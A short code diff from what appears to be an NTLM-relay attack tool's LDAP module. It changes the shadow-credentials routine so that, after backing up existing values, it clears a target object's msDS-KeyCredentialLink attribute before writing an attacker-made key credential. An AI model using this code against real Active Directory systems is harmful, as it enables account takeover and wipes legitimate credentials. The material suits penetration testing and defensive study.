@@ -336,6 +336,12 @@ class LDAPAttack(ProtocolAttack):
                         currentShadowCredentialsTarget, existing_values, self.config.ShadowCredentialsBackupPath)
                     LOG.info('Exported %d existing KeyCredential(s) to %s', backup_count, backup_path)
 
+                    LOG.info('Clearing existing msDS-KeyCredentialLink values')
+                    self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
+                    if self.client.result['result'] != 0:
+                        self._handleShadowCredentialModifyError()
+                        return
+
                 new_values = [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target_dn)]
             else:
                 new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
